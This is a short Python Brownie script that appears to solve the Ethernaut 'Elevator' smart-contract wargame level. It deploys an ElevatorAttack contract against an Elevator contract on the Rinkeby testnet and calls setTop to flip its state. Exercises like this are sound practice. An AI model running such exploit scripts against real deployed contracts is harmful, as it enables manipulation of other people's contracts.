#!/usr/bin/python3
from brownie import Elevator, ElevatorAttack
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0x15e222E86df204537Dff263d28e8335e2d34100f


def setTop(contract_address=None, attacker=None):
    if not contract_address:
        elevator_contract, owner = deploy()
        contract_address = elevator_contract.address
        _, attacker = get_account()
    else:
        elevator_contract = Elevator.at(contract_address)

    print(f"{green}Top -> {red}{elevator_contract.top()}{reset}")
    print(f"{green}Floor -> {red}{elevator_contract.floor()}{reset}")

    elevator_attack = ElevatorAttack.deploy(
        elevator_contract.address, {"from": attacker}
    )
    elevator_attack.setTop(100, {"from": attacker})

    print(f"{green}Top -> {red}{elevator_contract.top()}{reset}")
    print(f"{green}Floor -> {red}{elevator_contract.floor()}{reset}")


def main(contract_address=None):
    if contract_address:
        setTop(contract_address, get_account())
    else:
        setTop()


if __name__ == "__main__":
    main()
